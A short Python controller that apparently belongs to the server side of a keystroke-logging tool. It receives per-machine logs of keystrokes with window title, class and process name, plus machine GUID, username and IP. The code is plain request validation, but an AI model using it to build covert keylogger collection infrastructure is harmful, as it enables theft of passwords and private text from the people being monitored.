from app.errors import DomainError
from app.services.log_proccesor import LogProcessor
from app.data_transfer_objects import LogEntryDTO, CreateLogCommand
from typing import List


class LogsController:
    def __init__(self,log_pcr: LogProcessor):
        self.log_pcr = log_pcr

    def add_log(self, payload, ip_addr: str):
        logs: List[LogEntryDTO]
        cmd: CreateLogCommand

        try:
            logs = [
                LogEntryDTO(
                    window_title = entry["window_info"]["title"],
                    window_class = entry["window_info"]["class_name"],
                    window_process = entry["window_info"]["process_name"],
                    timestamp = int(entry["timestamp"]),
                    keystrokes = entry["keystrokes"]
                )
                for entry in payload["logs_data"]
            ]
        except (KeyError, ValueError, TypeError):
            return {"error": "invalid log format"}, 400

        try:
            cmd = CreateLogCommand(
                logs=logs,
                machine_guid=payload["computer_info"]["machine_guid"],
                username=payload["computer_info"]["username"],
                ip=ip_addr
            )
        except (KeyError, TypeError):
            return {"error": "invalid computer info format"}, 400

        try:
            self.log_pcr.process_log(cmd)
        except DomainError:
            return {"error": "Server error"}, 500

        return "OK", 200